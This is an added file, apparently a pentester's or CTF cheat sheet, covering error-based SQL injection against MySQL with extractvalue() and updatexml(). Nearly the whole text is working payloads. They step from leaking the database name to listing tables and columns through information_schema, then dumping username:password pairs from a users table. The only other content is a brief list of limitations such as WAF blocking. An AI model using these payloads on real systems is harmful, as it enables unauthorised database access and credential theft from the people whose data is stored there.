@@ -1,0 +1,143 @@
+Error-Based SQL Injection
+
+Basic Injection Structure
+
+' AND payload-- -
+
+Part| Purpose
+"'"| Break original query
+"AND / OR"| Inject condition
+"payload"| Malicious query
+"-- -"| Comment remaining query
+
+---
+
+Core Functions
+
+extractvalue()
+
+extractvalue(XML_document, XPath_expression)
+
+updatexml()
+
+updatexml(XML_document, XPath_expression, new_value)
+
+Both trigger XPath errors which leak data in the error message.
+
+---
+
+Helper Functions
+
+concat()        → combine strings
+group_concat()  → combine multiple rows
+substring()     → extract part of a string
+limit           → fetch rows one by one
+database()      → current database name
+
+---
+
+1️⃣ Extract Database Name
+
+extractvalue
+
+' AND extractvalue(1,concat('~',database(),'~'))-- -
+
+updatexml
+
+' AND updatexml(1,concat('~',database(),'~'),1)-- -
+
+---
+
+2️⃣ Extract Table Names
+
+extractvalue
+
+' AND extractvalue(1,concat('~',
+(SELECT table_name FROM information_schema.tables LIMIT 0,1)
+,'~'))-- -
+
+updatexml
+
+' AND updatexml(1,concat('~',
+(SELECT table_name FROM information_schema.tables LIMIT 0,1)
+,'~'),1)-- -
+
+---
+
+3️⃣ Extract Column Names
+
+extractvalue
+
+' AND extractvalue(1,concat('~',
+(SELECT column_name FROM information_schema.columns
+WHERE table_name='users' LIMIT 0,1)
+,'~'))-- -
+
+updatexml
+
+' AND updatexml(1,concat('~',
+(SELECT column_name FROM information_schema.columns
+WHERE table_name='users' LIMIT 0,1)
+,'~'),1)-- -
+
+---
+
+4️⃣ Extract User Credentials
+
+extractvalue
+
+' AND extractvalue(1,concat('~',
+(SELECT GROUP_CONCAT(username,':',password) FROM users)
+,'~'))-- -
+
+updatexml
+
+' AND updatexml(1,concat('~',
+(SELECT GROUP_CONCAT(username,':',password) FROM users)
+,'~'),1)-- -
+
+---
+
+Enumeration Methods
+
+LIMIT (one by one)
+
+LIMIT 0,1
+LIMIT 1,1
+LIMIT 2,1
+
+Example:
+
+SELECT table_name FROM information_schema.tables LIMIT 1,1
+
+---
+
+GROUP_CONCAT (all at once)
+
+Tables:
+
+SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
+
+Columns:
+
+SELECT GROUP_CONCAT(column_name)
+FROM information_schema.columns
+WHERE table_name='users'
+
+---
+
+Quick Reference
+
+Database → database()
+Tables → information_schema.tables
+Columns → information_schema.columns
+Multiple rows → GROUP_CONCAT()
+Single row → LIMIT
+
+---
+
+Limitations
+
+- Error messages may be hidden
+- Output may be truncated
+- WAF may block payloads
